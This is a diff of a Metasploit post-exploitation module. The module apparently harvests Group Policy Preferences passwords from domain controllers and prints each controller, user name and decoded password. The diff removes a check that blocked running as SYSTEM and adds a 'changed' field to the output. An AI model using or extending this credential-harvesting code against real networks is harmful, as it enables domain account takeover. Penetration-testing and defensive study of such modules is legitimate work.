@@ -28,9 +28,6 @@ class Metasploit3 < Msf::Post
 
 				Users can specify ALL=True to target all domains and their domain controllers
 				on the network.
-
-				This module must be run under a domain user or the user will not have appropriate
-				permissions to read files from the domain controller(s).
 			},
 			'License'       => MSF_LICENSE,
 			'Author'        =>[
@@ -57,11 +54,6 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
-		if is_system?
-			print_error "This needs to be run as a Domain User, not SYSTEM"
-			return nil
-		end
-
 		dcs = []
 		paths = []
 
@@ -86,7 +78,7 @@ class Metasploit3 < Msf::Post
 				dcs << found_dcs[0] unless found_dcs.to_a.empty?
 			end
 		elsif datastore['CURRENT']
-			dcs << get_domain_controller()
+			dcs << get_domain_controller
 		else
 			print_error "Invalid Arguments, please supply one of CURRENT, ALL or DOMAINS arguments"
 			return nil
@@ -155,6 +147,7 @@ class Metasploit3 < Msf::Post
 			user = node.attributes['userName']
 			newname = node.attributes['newName']
 			disabled = node.attributes['acctDisabled']
+			changed = node.attributes['changed']
 
 			# Check if policy also specifies the user is renamed.
 			if !newname.to_s.empty?
@@ -165,7 +158,11 @@ class Metasploit3 < Msf::Post
 
 			# UNICODE conversion
 			pass = pass.unpack('v*').pack('C*')
-			print_good("DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} DISABLED: #{disabled}")
+			print_good(
+				%Q{
+				"DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} 
+				DISABLED: #{disabled} CHANGED: #{changed}"
+				})
 
 			if session.db_record
 				source_id = session.db_record.id
@@ -277,7 +274,7 @@ class Metasploit3 < Msf::Post
 		return value
 	end
 
-	def get_domain_controller()
+	def get_domain_controller
 		domain = nil
 		begin
 			subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
